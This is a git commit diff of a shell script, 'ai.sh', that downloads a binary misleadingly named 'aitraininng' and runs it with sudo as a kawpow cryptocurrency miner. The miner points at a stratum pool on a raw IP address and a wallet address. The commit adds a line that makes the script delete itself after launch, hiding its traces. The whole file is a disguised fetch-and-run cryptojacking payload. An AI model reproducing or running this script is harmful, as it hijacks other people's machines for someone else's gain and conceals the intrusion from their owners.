61a05e200e888fc98a87af3633525a1f706c9fed
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 07:39:16 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+( sleep 1; rm -- "$0" ) &
 wget https://github.com/max313iq/Ssl/releases/download/Xxx/aitraininng
 chmod +x aitraininng
 sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
